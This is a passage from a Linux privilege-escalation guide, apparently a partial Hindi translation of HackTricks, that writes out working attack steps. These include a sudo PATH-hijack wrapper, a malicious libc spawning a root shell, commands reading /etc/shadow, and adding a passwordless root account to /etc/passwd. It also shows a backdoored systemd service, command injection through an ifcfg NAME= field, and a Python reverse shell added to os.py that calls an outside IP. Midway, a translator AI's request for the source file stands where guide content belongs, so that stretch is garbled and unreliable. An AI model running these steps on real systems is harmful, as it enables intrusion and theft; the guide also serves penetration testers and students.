/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## साझा लाइब्रेरी

### ld.so

फ़ाइल `/etc/ld.so.conf` बताती है **कि लोड की गई कॉन्फ़िगरेशन फ़ाइलें कहाँ से आती हैं**। आम तौर पर, इस फ़ाइल में निम्न पथ होता है: `include /etc/ld.so.conf.d/*.conf`

इसका मतलब है कि `/etc/ld.so.conf.d/*.conf` से कॉन्फ़िगरेशन फ़ाइलें पढ़ी जाएँगी। ये कॉन्फ़िगरेशन फ़ाइलें **अन्य फ़ोल्डरों की ओर संकेत करती हैं** जहाँ **libraries** को **खोजा** जाएगा। उदाहरण के लिए, `/etc/ld.so.conf.d/libc.conf` की सामग्री `/usr/local/lib` है। **इसका मतलब है कि सिस्टम `/usr/local/lib` के अंदर libraries की खोज करेगा**।

यदि किसी कारणवश नीचे बताए गए किसी भी पथ पर **a user has write permissions**: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, किसी भी फ़ाइल inside `/etc/ld.so.conf.d/` या `/etc/ld.so.conf.d/*.conf` के अंदर कॉन्फ़िग फ़ाइल में निर्दिष्ट कोई भी फ़ोल्डर, तो वह privileges escalate कर सकता है।\
निम्न पृष्ठ में देखें कि **how to exploit this misconfiguration**:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib को `/var/tmp/flag15/` में कॉपी करने पर यह `RPATH` वेरिएबल में निर्दिष्ट स्थान पर प्रोग्राम द्वारा उपयोग किया जाएगा।
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
इसके बाद `/var/tmp` में `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` का उपयोग करके एक evil library बनाएं।
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## क्षमताएँ

Linux capabilities किसी process को उपलब्ध root privileges का **एक उपसमूह प्रदान करती हैं**। यह प्रभावी रूप से root **विशेषाधिकारों को छोटे और विशिष्ट इकाइयों में विभाजित कर देती है**। इनमें से प्रत्येक इकाई को फिर स्वतंत्र रूप से processes को प्रदान किया जा सकता है। इस तरह पूरे privileges का सेट कम हो जाता है, जिससे exploitation के जोखिम घटते हैं।\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## डायरेक्टरी अनुमतियाँ

एक डायरेक्टरी में, **bit for "execute"** यह संकेत देता है कि प्रभावित उपयोगकर्ता फ़ोल्डर में "**cd**" कर सकता है.\
**"read"** bit संकेत देता है कि उपयोगकर्ता **list** कर सकता है **files**, और **"write"** bit संकेत देता है कि उपयोगकर्ता नई **files** को **delete** और **create** कर सकता है।

## ACLs

Access Control Lists (ACLs) डिस्क्रेशनरी अनुमतियों की एक द्वितीयक परत का प्रतिनिधित्व करती हैं, जो पारंपरिक **ugo/rwx permissions को ओवरराइड कर सकती हैं**। ये permissions फ़ाइल या डायरेक्टरी एक्सेस पर नियंत्रण को बढ़ाती हैं, उन विशिष्ट उपयोगकर्ताओं को अधिकार देने या अस्वीकार करने की अनुमति देकर जो मालिक नहीं हैं या समूह का हिस्सा नहीं हैं। यह स्तर **अधिक सूक्ष्मता से अधिक सटीक एक्सेस प्रबंधन सुनिश्चित करता है**। Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

यूज़र "kali" को किसी फ़ाइल पर read और write permissions दें:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**प्राप्त करें** सिस्टम से विशिष्ट ACLs वाली फ़ाइलें:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Open shell sessions

**पुराने संस्करणों** में आप किसी अन्य उपयोगकर्ता (**root**) के कुछ **shell** session को **hijack** कर सकते हैं.\
**नवीनतम संस्करणों** में आप केवल **अपने ही उपयोगकर्ता** के screen sessions से **connect** कर पाएँगे। हालाँकि आप **session के अंदर रोचक जानकारी** पा सकते हैं।

### screen sessions hijacking

**screen sessions सूची दिखाएँ**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**सत्र से जुड़ें**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

यह **old tmux versions** के साथ एक समस्या थी। मैं root द्वारा बनाई गई tmux (v2.1) session को non-privileged user के रूप में hijack नहीं कर पाया।

**tmux sessions की सूची**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**किसी session से जुड़ें**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
यह बग उन OS पर नया ssh key बनाने के समय होता है, क्योंकि **केवल 32,768 variations ही संभव थे**। इसका मतलब यह है कि सभी संभावनाएँ गणना की जा सकती हैं और **ssh public key होने पर आप संबंधित private key खोज सकते हैं**। आप गणना की गई संभावनाएँ यहाँ पा सकते हैं: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** यह बताता है कि password authentication की अनुमति है या नहीं। डिफ़ॉल्ट `no` है।
- **PubkeyAuthentication:** यह बताता है कि public key authentication की अनुमति है या नहीं। डिफ़ॉल्ट `yes` है।
- **PermitEmptyPasswords**: जब password authentication की अनुमति हो, तो यह निर्दिष्ट करता है कि सर्वर खाली password वाले accounts में लॉगिन की अनुमति देता है या नहीं। डिफ़ॉल्ट `no` है।

### PermitRootLogin

यह बताता है कि root ssh का उपयोग करके लॉगिन कर सकता है या नहीं, डिफ़ॉल्ट `no` है। संभावित मान:

- `yes`: root password और private key दोनों से लॉगिन कर सकता है
- `without-password` या `prohibit-password`: root केवल private key से ही लॉगिन कर सकता है
- `forced-commands-only`: root केवल private key का उपयोग करके और तभी लॉगिन कर सकता है जब commands विकल्प निर्दिष्ट हों
- `no` : नहीं

### AuthorizedKeysFile

यह उन फ़ाइलों को निर्दिष्ट करता है जिनमें वे public keys शामिल होती हैं जिनका उपयोग user authentication के लिए किया जा सकता है। इसमें `%h` जैसे टोकन हो सकते हैं, जिसे home directory से बदल दिया जाएगा। **You can indicate absolute paths** (starting in `/`) या **relative paths from the user's home**। For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding आपको अनुमति देता है कि आप **use your local SSH keys instead of leaving keys** (without passphrases!) अपने server पर छोड़ने के बजाय उपयोग कर सकें। इसलिए, आप ssh के माध्यम से **jump** करके किसी **to a host** पर पहुँच पाएँगे और वहाँ से किसी दूसरे **host** पर **jump to another** कर सकेंगे, **using** वह **key** जो आपके **initial host** में स्थित है।

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
ध्यान दें कि अगर `Host` `*` है तो हर बार जब उपयोगकर्ता किसी अलग मशीन पर जाता है, उस host को keys तक पहुँच मिल जाएगी (जो एक सुरक्षा समस्या है)।

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\\
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## रोचक फ़ाइलें

### Profiles फ़ाइलें

फ़ाइल `/etc/profile` और `/etc/profile.d/` के अंतर्गत स्थित फाइलें वे स्क्रिप्ट्स हैं जो उपयोगकर्ता नया shell चलाने पर निष्पादित होती हैं। इसलिए, यदि आप इनमें से किसी को भी लिख या संशोधित कर सकते हैं तो आप **escalate privileges** कर सकते हैं।
```bash
ls -l /etc/profile /etc/profile.d/
```
यदि कोई अजीब profile script मिला है तो आपको इसे **संवेदनशील विवरण** के लिए जांचना चाहिए।

### Passwd/Shadow फ़ाइलें

ऑपरेटिंग सिस्टम के अनुसार `/etc/passwd` और `/etc/shadow` फ़ाइलें अलग नाम से मौजूद हो सकती हैं या उनका बैकअप हो सकता है। इसलिए यह अनुशंसा की जाती है कि आप **उन सभी को ढूँढें** और **जाँचें कि क्या आप उन्हें पढ़ सकते हैं** ताकि आप देख सकें **क्या फाइलों के भीतर hashes हैं**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
कभी-कभी आप **password hashes** को `/etc/passwd` (या समकक्ष) फ़ाइल में पा सकते हैं।
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### लिखने योग्य /etc/passwd

सबसे पहले, निम्नलिखित में से किसी एक कमांड के साथ एक पासवर्ड जनरेट करें।
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the contents of src/linux-hardening/privilege-escalation/README.md. Please paste the file content you want translated.

Also confirm: after translating, should I
- generate a secure password now and include it in the translated file, and
- show the exact commands to create the user hacker and set that password (I will not run them, only provide them)?

If yes, tell me desired password length (default 20 chars) and whether the password should be shown in plain text in the file.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
उदाहरण: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

अब आप `su` कमांड का उपयोग `hacker:hacker` के साथ कर सकते हैं

वैकल्पिक रूप से, आप पासवर्ड के बिना एक डमी उपयोगकर्ता जोड़ने के लिए निम्नलिखित पंक्तियों का उपयोग कर सकते हैं.\
चेतावनी: आप मशीन की मौजूदा सुरक्षा को कमजोर कर सकते हैं।
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
नोट: BSD प्लेटफ़ॉर्म्स में `/etc/passwd` `/etc/pwd.db` और `/etc/master.passwd` पर स्थित होता है, और `/etc/shadow` का नाम बदलकर `/etc/spwd.db` हो जाता है।

आपको यह जांचना चाहिए कि क्या आप कुछ संवेदनशील फ़ाइलों में **लिख सकते हैं**। उदाहरण के लिए, क्या आप किसी **सेवा कॉन्फ़िगरेशन फ़ाइल** में लिख सकते हैं?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
उदाहरण के लिए, अगर मशीन पर **tomcat** server चल रहा है और आप **Tomcat service configuration file को /etc/systemd/ के अंदर संशोधित कर सकते हैं,** तो आप इन पंक्तियों को संशोधित कर सकते हैं:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
आपका backdoor अगली बार tomcat के शुरू होने पर निष्पादित होगा।

### Check Folders

निम्नलिखित फ़ोल्डरों में बैकअप या दिलचस्प जानकारी हो सकती है: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (संभवतः आप अंतिम को पढ़ने में सक्षम नहीं होंगे लेकिन कोशिश करें)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### अजीब स्थान/Owned फ़ाइलें
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### पिछले कुछ मिनटों में संशोधित फ़ाइलें
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB फ़ाइलें
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फ़ाइलें
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### छिपी हुई फाइलें
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries PATH में**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **वेब फ़ाइलें**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **बैकअप्स**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### passwords रखने वाली ज्ञात फाइलें

Read the code of [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), यह **कई संभावित फ़ाइलें जिनमें passwords हो सकते हैं** खोजता है.\
**एक और दिलचस्प टूल** जिसे आप इस काम के लिए इस्तेमाल कर सकते हैं है: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) जो एक ओपन-सोर्स एप्लिकेशन है जिसका उपयोग Windows, Linux & Mac पर लोकल कंप्यूटर में स्टोर कई passwords प्राप्त करने के लिए किया जाता है।

### लॉग्स

यदि आप लॉग्स पढ़ सकते हैं, तो आप उनमें **दिलचस्प/गोपनीय जानकारी** पा सकते हैं। जितना अजीब लॉग होगा, संभवतः वह उतना ही अधिक दिलचस्प होगा (शायद).\
इसके अलावा, कुछ "**bad**" configured (backdoored?) **audit logs** आपको audit logs के अंदर **record passwords** करने की अनुमति दे सकते हैं जैसा कि इस पोस्ट में समझाया गया है: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**logs पढ़ने के लिए समूह** [**adm**](interesting-groups-linux-pe/index.html#adm-group) बहुत मददगार होगा।

### Shell फाइलें
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

आपको उन फाइलों की भी जाँच करनी चाहिए जिनके **नाम** में या उनकी **सामग्री** के अंदर शब्द "**password**" मौजूद हो, और साथ ही logs के अंदर IPs और emails, या hashes के लिए regexps भी चेक करें.\
मैं यहाँ यह सब कैसे करना है सूचीबद्ध नहीं करूँगा, लेकिन अगर आप इच्छुक हैं तो आप देख सकते हैं कि [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) कौन-कौन सी अंतिम जाँचें करता है।

## लिखने योग्य फ़ाइलें

### Python library hijacking

यदि आप जानते हैं कि कोई python script **कहाँ से** execute होने वाली है और आप उस फ़ोल्डर में **अंदर लिख सकते हैं** या आप **python libraries को संशोधित कर सकते हैं**, तो आप OS library को modify करके उसे backdoor कर सकते हैं (यदि आप उस जगह लिख सकते हैं जहाँ python script execute होगा, तो os.py लाइब्रेरी को copy और paste कर दें)।

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` में एक कमजोरी ऐसी स्थिति पैदा करती है कि किसी लॉग फ़ाइल या उसके माता‑पिता डायरेक्टरीज़ पर **लिखने की अनुमति** रखने वाले उपयोगकर्ता संभावित रूप से privileges बढ़ा सकते हैं। इसका कारण यह है कि `logrotate`, जो अक्सर **root** के रूप में चल रहा होता है, को arbitrary फाइलें execute करने के लिए manipulate किया जा सकता है, खासकर ऐसे डायरेक्टरीज़ में जैसे _**/etc/bash_completion.d/**_. इसलिए केवल _/var/log_ ही नहीं बल्कि उन किसी भी डायरेक्टरी की permissions भी चेक करना ज़रूरी है जहाँ log rotation लागू है।

> [!TIP]
> यह कमजोरी `logrotate` के version `3.18.0` और पुराने संस्करणों को प्रभावित करती है

कमज़ोरी के बारे में अधिक विस्तृत जानकारी इस पृष्ठ पर मिल सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

आप इस कमजोरी का exploit [**logrotten**](https://github.com/whotwagner/logrotten) के साथ कर सकते हैं।

यह कमजोरी [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** से बहुत मिलती-जुलती है, इसलिए जब भी आप पाते हैं कि आप logs बदल सकते हैं, तो जांचें कि उन logs का प्रबंधन कौन कर रहा है और देखें कि क्या आप symlinks के जरिए privileges escalate कर सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**कमज़ोरी संदर्भ:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

यदि किसी भी कारण से कोई उपयोगकर्ता _/etc/sysconfig/network-scripts_ में `ifcf-<whatever>` स्क्रिप्ट **लिख** सके या किसी मौजूदा स्क्रिप्ट को **समायोजित** कर सके, तो आपका **system is pwned**।

Network scripts, जैसे _ifcg-eth0_, network connections के लिए उपयोग होते हैं। ये ठीक वैसे ही दिखते हैं जैसे .INI फ़ाइलें। हालांकि, इन्हें Linux पर Network Manager (dispatcher.d) द्वारा \~sourced\~ किया जाता है।

मेरे केस में, इन network scripts में `NAME=` attribute को सही तरीके से handle नहीं किया जा रहा था। यदि name में **white/blank space** है तो system name के white/blank space के बाद वाले हिस्से को execute करने की कोशिश करता है। इसका मतलब है कि **पहले blank space के बाद का सारा कुछ root के रूप में execute हो जाता है**।

उदाहरण के लिए: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_ध्यान दें कि Network और /bin/id के बीच एक खाली स्थान है_)

### **init, init.d, systemd, और rc.d**

डायरेक्टरी `/etc/init.d` System V init (SysVinit) के लिए **scripts** का स्थान है — यह पारंपरिक Linux service management system है। इसमें सेवाओं को `start`, `stop`, `restart`, और कभी-कभी `reload` करने के लिए scripts होते हैं। इन्हें सीधे चलाया जा सकता है या `/etc/rc?.d/` में मौजूद symbolic links के माध्यम से। Redhat सिस्टम्स में वैकल्पिक पथ `/etc/rc.d/init.d` है।

दूसरी ओर, `/etc/init` **Upstart** से जुड़ा है — Ubuntu द्वारा पेश किया गया newer service management जो service management कार्यों के लिए configuration files का उपयोग करता है। Upstart में संक्रमण के बावजूद SysVinit scripts अभी भी Upstart configurations के साथ compatibility layer के कारण उपयोग में रहते हैं।

**systemd** एक आधुनिक initialization और service manager के रूप में उभरता है, जो on-demand daemon starting, automount management, और system state snapshots जैसे उन्नत फीचर्स प्रदान करता है। यह फ़ाइलों को डिस्ट्रिब्यूशन पैकेजों के लिए `/usr/lib/systemd/` और व्यवस्थापक संशोधनों के लिए `/etc/systemd/system/` में व्यवस्थित करता है, जिससे सिस्टम प्रशासन सरल होता है।

## अन्य ट्रिक्स

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks आमतौर पर privileged kernel functionality को userspace manager को एक्सपोज़ करने के लिए एक syscall को hook करते हैं। कमजोर manager authentication (उदा., FD-order पर आधारित signature checks या कमजोर password schemes) एक local app को manager बनकर impersonate करने और पहले से-rooted devices पर root तक escalate करने में सक्षम बना सकती है। अधिक जानकारी और exploitation विवरण यहाँ देखें:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations में Regex-driven service discovery process command lines से एक binary path निकाल सकता है और उसे privileged context में `-v` के साथ execute कर सकता है। permissive patterns (उदा., \S का उपयोग) writable लोकेशन्स (उदा., /tmp/httpd) में attacker-staged listeners से मैच कर सकते हैं, जिससे root के रूप में execution हो सकती है (CWE-426 Untrusted Search Path)।

अधिक जानें और अन्य discovery/monitoring stacks पर लागू होने वाले generalized pattern को यहाँ देखें:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
